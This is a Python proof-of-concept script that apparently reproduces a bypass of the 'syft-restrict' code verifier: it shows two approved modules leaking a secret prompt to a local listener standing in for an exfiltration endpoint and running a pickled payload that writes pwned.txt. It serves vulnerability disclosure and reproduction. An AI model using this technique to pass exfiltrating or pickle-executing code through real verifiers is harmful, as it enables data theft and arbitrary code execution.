#!/usr/bin/env python3
"""syft-restrict passes hidden code that exfiltrates, then we run it.

1. Analyze poc1_sorted_key_urlopen.py with the exact allow-list from
   notebooks/enclave/gemma/colab-3-persona/1. DO-model-owner-gemma-restrict.ipynb (harness.py): verdict ok=True.
2. Import the analyzed module and call forward(<secret prompt>) while a local
   listener on 127.0.0.1:8765 stands in for the exfiltration endpoint.
3. Analyze + run poc2_pickle_rce.py: ok=True, then setup() executes an
   arbitrary pickled payload (writes pwned.txt).
"""
import http.server, importlib.util, os, subprocess, sys, threading
HERE = os.path.dirname(os.path.abspath(__file__))
got = []
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        got.append(self.path); self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass
srv = http.server.HTTPServer(("127.0.0.1", 8765), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()

verdicts = []

def analyze_and_load(name):
    out = subprocess.run([sys.executable, os.path.join(HERE, "harness.py"), os.path.join(HERE, name)],
                         capture_output=True, text=True).stdout.strip()
    print(f"[syft-restrict] {name}: {out.splitlines()[0]}")
    verdicts.append(out.startswith("ok = True"))
    spec = importlib.util.spec_from_file_location(name[:-3], os.path.join(HERE, name))
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
    return m

m = analyze_and_load("poc1_sorted_key_urlopen.py")
m.forward("SECRET_BENCHMARK_PROMPT")
print("[listener] received:", got)

os.chdir(HERE)
if os.path.exists("pwned.txt"): os.remove("pwned.txt")
m2 = analyze_and_load("poc2_pickle_rce.py")
m2.setup()
pw = open("pwned.txt").read().strip() if os.path.exists("pwned.txt") else None
print("[payload] pwned.txt:", pw)
if os.path.exists("pwned.txt"): os.remove("pwned.txt")
ok = all(verdicts) and any("SECRET_BENCHMARK_PROMPT" in p for p in got) and pw
# The runtime steps run regardless of the verdict, to show what the analyzed code does.
print("RESULT:", "REPRODUCED: verifier-approved hidden code exfiltrated data and ran an unanalyzed payload" if ok
      else "not reproduced (verifier verdicts: %s)" % verdicts)
sys.exit(0 if ok else 1)
